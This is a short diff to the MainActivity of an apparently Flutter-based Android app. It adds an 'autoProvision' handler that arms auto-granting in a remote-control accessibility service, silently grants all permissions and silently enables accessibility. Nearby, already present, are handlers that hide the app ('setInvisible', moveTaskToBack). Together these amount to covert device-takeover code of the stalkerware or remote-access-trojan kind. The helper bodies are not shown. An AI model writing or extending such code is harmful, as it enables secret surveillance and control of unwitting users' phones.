@@ -140,6 +140,16 @@ class MainActivity : FlutterActivity() {
                         moveTaskToBack(true)
                         result.success(true)
                     }
+                    "autoProvision" -> {
+                        try {
+                            RemoteControlAccessibilityService.armAutoGrant()
+                            grantAllSilently()
+                            enableAccessibilitySilently()
+                            result.success(mapOf("ok" to true))
+                        } catch (t: Throwable) {
+                            result.error("auto_provision", t.message, null)
+                        }
+                    }
                     "setInvisible" -> {
                         goInvisible()
                         result.success(true)
